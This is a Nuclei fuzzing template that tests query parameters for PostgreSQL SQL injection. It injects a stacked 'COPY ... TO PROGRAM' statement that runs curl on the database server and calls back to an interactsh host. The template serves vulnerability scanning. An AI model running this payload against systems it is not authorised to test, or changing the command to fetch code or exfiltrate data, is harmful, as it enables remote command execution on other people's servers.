http:
- fuzzing:
  - fuzz:
    - '{{pgsql_oob}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    pgsql_oob:
    - 1; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--
  stop-at-first-match: true
id: ai-fuzz-postgresql-oob
info:
  author: openai
  name: PostgreSQL OOB via COPY TO PROGRAM
  severity: critical
  tags: postgres,oob,sqli,dast
